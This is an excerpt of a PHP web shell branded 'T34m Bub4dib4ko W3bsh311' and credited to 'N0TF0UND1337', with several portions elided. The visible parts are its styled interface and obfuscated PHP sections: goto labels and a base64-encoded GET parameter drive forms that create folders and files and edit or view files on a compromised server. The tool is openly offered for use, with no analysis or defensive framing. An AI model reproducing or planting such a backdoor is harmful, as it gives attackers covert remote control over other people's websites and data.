...
<html lang="en">
<head>
<meta property="og:image" content="https://i.postimg.cc/pL9JQKpn/notfoundmask.png" />
<meta property="og:title" content="T34m Bub4dib4ko W3bsh311" />
<meta property="og:description" content="" />
<meta name="theme-color" content="Green">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<title>T34m Bub4dib4ko W3bsh311</title>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="https://i.postimg.cc/pL9JQKpn/notfoundmask.png">
<style type="text/css">
...
.table thead th {
    ...
    box-shadow: inset 0px 0px 0px 1.5px Green;
    color: Red;
    padding: 0.25rem;
    border-radius: 5px;
...
<body>
<div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid Green;border-radius:5px;">
    <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
        <a href="?" style="font-size: 2rem;font-family: Merienda;text-shadow: 0px 0px 10px Green;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">T34m Bub4dib4ko W3bsh311</span></a>
    </div>
		...
		<li>Recode By : <a href="?" style="font-size: 1rem;font-family: Merienda;text-shadow: 0px 0px 10px Green;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">N0TF0UND1337</span></a>
...
<div class="table-responsive text-light" style="text-align: left;padding: 4px;margin-bottom: 3px;margin-top: 3px;border: 2px solid Green;border-radius:5px;">
...
Fg:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Green;border-radius:5px;">New Folder Name :</h5>
<form method="post">
...
Pb:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Green;border-radius:5px;">New File Name :</h5>
<form method="post">
<div class="form-group">
...
Ox:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Green;border-radius:5px;">Edit File Name : <font color="white"><?= Jd(
    $_GET[base64_decode('bg==')]
) ?></font></h5>
<form method="post">
<div class="form-group">
...
Ag:
?>
<h5 class="p-1" style="text-align: center;border: 2px solid Green;border-radius:5px;">View File Name : <font color="white"><?= jd(
    $_GET[base64_decode('bg==')]
) ?></font></h5>
<div class="form-group">
